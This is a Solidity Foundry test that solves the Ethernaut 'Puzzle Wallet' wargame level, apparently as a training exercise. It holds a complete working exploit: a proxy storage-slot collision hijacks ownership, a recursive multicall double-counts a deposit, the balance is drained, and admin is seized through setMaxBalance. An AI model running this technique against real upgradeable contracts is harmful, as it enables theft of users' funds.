// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/24-PuzzleWallet/PuzzleWalletFactory.sol";
import "../src/Ethernaut.sol";

contract PuzzleWalletTest is Test {
    Ethernaut ethernaut;
    address playerAddress = address(6529);
    bytes[] depositData;
    bytes[] multicallData;

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(playerAddress, 3 ether);
    }

    function testPuzzleWallet() public {
        // Level Setup
        PuzzleWalletFactory puzzleWalletFactory = new PuzzleWalletFactory();
        ethernaut.registerLevel(puzzleWalletFactory);
        vm.startPrank(playerAddress);
        address levelAddress = ethernaut.createLevelInstance{value: 2 ether}(puzzleWalletFactory);
        PuzzleProxy ethernautPuzzleProxy = PuzzleProxy(payable(levelAddress));
        PuzzleWallet ethernautPuzzleWallet = PuzzleWallet(levelAddress);  //Needs to be the same address as Proxy
        emit log_named_address("Puzzle Wallet owner BEFORE admin proposal", ethernautPuzzleWallet.owner());
        emit log_named_address("playerAddress", playerAddress);

        // Level Attack
        // Sets owner (slot 0) on PuzzleWallet because proposeNewAdmin is slot0 in the Puzzle Proxy contract due to delegatecall
        ethernautPuzzleProxy.proposeNewAdmin(playerAddress);
        emit log_named_address("Puzzle Wallet owner AFTER admin proposal", ethernautPuzzleWallet.owner());
    
        // Since we're the owner now we can whitelist ourselves (playerAddress) and Puzzle Wallet address
        ethernautPuzzleWallet.addToWhitelist(playerAddress);
        ethernautPuzzleWallet.addToWhitelist(levelAddress);

        /* We need to become the proxy admin. Need to keep exploiting the storage layout not being in identical order
        Now the goal is to set the admin address through the max balance
        before being able to change the maxValue we need to find a way to drain the balance in the
        proxy contract otherwise the tx for `setMaxBalance(uint256(playerAddress1Address))` will revert

        The `multicall` method prevents calling `deposit` multiple times
        If we can recursively call `multicall`, we can call 2x the deposit but sending only the amount of ETH for one call
        */
        emit log_named_uint("Puzzle Wallet/Proxy current balance", address(ethernautPuzzleProxy).balance/1 ether);
        uint256 depositMultiCalls = address(ethernautPuzzleProxy).balance / (1 ether) + 1; // +1 because 1 ether will be sent with the "recursive" call
        bytes memory depositSignature = abi.encodeWithSignature("deposit()");
        depositData.push(depositSignature);
        multicallData.push(depositSignature);
        for (uint i = 1; i < depositMultiCalls; i++) {
            multicallData.push(abi.encodeWithSignature("multicall(bytes[])", depositData));
        }

        emit log("Setting Wallet playerAddress balance to proxy.balance...");
        ethernautPuzzleWallet.multicall{value: 1 ether}(multicallData);
        emit log_named_uint("Puzzle Wallet/Proxy after multicallData deposit balance", address(ethernautPuzzleProxy).balance/1 ether);

        emit log("Draining balance...");
        ethernautPuzzleWallet.execute(playerAddress, address(ethernautPuzzleProxy).balance, "");
        emit log_named_uint("Puzzle Wallet/Proxy current balance", address(ethernautPuzzleProxy).balance/1 ether);

        // Again playing with storage positions: Wallet maxBalance = Proxy admin
        emit log_named_address("Setting user maxBalance to playerAddress", playerAddress);
        ethernautPuzzleWallet.setMaxBalance(uint256(uint160(playerAddress)));
        emit log_named_address("Puzzle Proxy admin", ethernautPuzzleProxy.admin());

        // Level Submission
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress)); 
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}